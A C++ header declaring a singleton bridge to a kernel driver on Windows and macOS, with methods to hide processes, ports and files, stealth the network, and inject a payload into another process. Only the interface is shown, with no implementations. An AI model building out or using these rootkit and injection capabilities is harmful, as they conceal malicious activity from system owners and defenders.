#pragma once
#include <string>
#include <vector>
#include <cstdint>

#ifdef _WIN32
#include <windows.h>
#else
#include <IOKit/IOKitLib.h>
#endif

namespace interlock {

class SovereignBridge {
public:
    static SovereignBridge& instance() {
        static SovereignBridge inst;
        return inst;
    }

    bool connect();
    void disconnect();

    // Kernel-Level Operations
    bool hideProcess(uint32_t pid);
    bool protectProcess(uint32_t pid);
    bool applyMemoryProtection();
    bool stealthNetwork(bool enable);
    bool setProcessOpaque(uint32_t pid, bool enable);
    bool hidePort(uint16_t port);
    bool injectPayload(uint32_t targetPid, const std::vector<uint8_t>& artifact);
    bool hideFile(const std::string& path);

    bool isConnected() const { return m_connected; }

private:
    SovereignBridge() : m_connected(false)
#ifdef _WIN32
    , m_hDevice(INVALID_HANDLE_VALUE)
#else
    , m_connection(0)
#endif
    {}

    bool m_connected;

#ifdef _WIN32
    HANDLE m_hDevice;
#else
    io_connect_t m_connection;
#endif
};

} // namespace interlock
